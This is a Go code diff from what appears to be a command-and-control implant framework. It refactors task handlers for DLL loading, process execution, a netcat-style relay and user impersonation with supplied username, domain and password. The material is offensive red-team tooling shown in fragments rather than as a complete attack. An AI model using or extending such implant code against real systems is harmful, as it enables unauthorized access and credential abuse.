@@ -59,22 +59,12 @@ var (
 	_ backer = (*com.Packet)(nil)
 )
 
+var errInvalidOp = xerr.Sub("invalid operation", 0x68)
+
 type backer interface {
 	WriteUint32Pos(int, uint32) error
 }
 
-func (DLL) task() uint8 {
-	return TvDLL
-}
-func (Zombie) task() uint8 {
-	return TvZombie
-}
-func (Process) task() uint8 {
-	return TvExecute
-}
-func (Assembly) task() uint8 {
-	return TvAssembly
-}
 func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
 	d, err := r.Int64()
 	if err != nil {
@@ -209,11 +199,12 @@ func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
 		c.Close()
 		return nil
 	}
+	n := data.NewCtxReader(x, c)
 	c.SetReadDeadline(time.Now().Add(k))
-	io.Copy(w, c)
+	_, err = io.Copy(w, n)
 	f()
-	c.Close()
-	return nil
+	n.Close()
+	return err
 }
 func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.StringVal()
@@ -465,18 +456,18 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			return err
 		}
 		return os.Remove(k)
-	default:
-		return xerr.Sub("invalid operation", 0x68)
 	}
+	return errInvalidOp
 }
 func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
 	// NOTE(dij): This function is here and NOT in an OS-specific file as I
 	//            hopefully will find a *nix way to do this also.
-	var (
-		u, d, p string
-		err     = r.ReadString(&u)
-	)
+	i, err := r.Bool()
 	if err != nil {
+		return err
+	}
+	var u, d, p string
+	if err = r.ReadString(&u); err != nil {
 		return err
 	}
 	if err = r.ReadString(&d); err != nil {
@@ -484,6 +475,9 @@ func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
 	}
 	if err = r.ReadString(&p); err != nil {
 		return err
+	}
+	if i {
+		return device.ImpersonateUser(u, d, p)
 	}
 	return device.ImpersonateUserNetwork(u, d, p)
 }
